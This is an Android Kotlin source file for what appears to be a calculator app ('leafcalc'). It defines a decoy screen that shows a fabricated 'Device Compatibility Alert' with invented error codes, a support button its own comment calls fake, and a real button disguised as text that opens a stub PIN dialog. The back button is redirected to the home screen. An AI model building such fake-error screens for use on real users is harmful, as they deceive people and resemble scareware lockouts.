package im.manus.leafcalc

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

class LockScreenActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            LeafCalcTheme {
                LockScreenContent()
            }
        }
    }

    @Composable
    fun LockScreenContent() {
        var showError by remember { mutableStateOf(false) }
        var showAuth by remember { mutableStateOf(false) }

        BackHandler {
            // Force return to Home Screen
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }

        Surface(
            modifier = Modifier.fillMaxSize(),
            color = MaterialTheme.colorScheme.background
        ) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(24.dp)
                    .verticalScroll(rememberScrollState()),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                Text(
                    text = "Device Compatibility Alert",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Red
                )
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Text(
                    text = "Status: DEVICE_INCOMPATIBLE (Code: 0xD4C‑SYS‑9082)",
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Medium
                )
                
                Spacer(modifier = Modifier.height(24.dp))
                
                Text(
                    text = "The application you are attempting to launch cannot be executed on this device due to incompatible system configuration or missing required components.\n\nPotential Causes:\n- Operating system version does not meet the minimum requirement.\n- Device hardware fails to satisfy necessary performance thresholds.\n- Required system libraries or services are unavailable.\n- Device security or administrative policies restrict application execution.\n\nRecommended Action:\nFor assistance resolving this issue, please contact Customer Service Support.\n\nReference ID: SYS‑CHK‑COMP‑2211\n\nAttempting to bypass this restriction may result in application malfunction or data loss.",
                    fontSize = 14.sp,
                    lineHeight = 20.sp
                )

                Spacer(modifier = Modifier.height(32.dp))

                // Fake Button
                Button(
                    onClick = { showError = true },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Customer Service Support")
                }

                if (showError) {
                    Text(
                        text = "Error 0x800: Connection Failed. Please try again later.",
                        color = Color.Red,
                        fontSize = 12.sp,
                        modifier = Modifier.padding(top = 8.dp)
                    )
                }

                Spacer(modifier = Modifier.height(48.dp))

                // Real Button (Hidden as text)
                TextButton(
                    onClick = { showAuth = true }
                ) {
                    Row {
                        Text(
                            text = "For further notice please contact ",
                            color = MaterialTheme.colorScheme.onBackground,
                            fontSize = 14.sp
                        )
                        Text(
                            text = "Customer Service Support",
                            color = MaterialTheme.colorScheme.onBackground,
                            fontSize = 15.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            }
        }
        
        if (showAuth) {
            AuthDialog(onDismiss = { showAuth = false })
        }
    }

    @Composable
    fun AuthDialog(onDismiss: () -> Unit) {
        // Implementation of PIN/Password pad would go here
        AlertDialog(
            onDismissRequest = onDismiss,
            title = { Text("Dial emergency code for customer service support") },
            text = { 
                TextField(value = "", onValueChange = {}, placeholder = { Text("Enter code") })
            },
            confirmButton = {
                TextButton(onClick = { /* Check PIN */ }) { Text("Confirm") }
            }
        )
    }
}
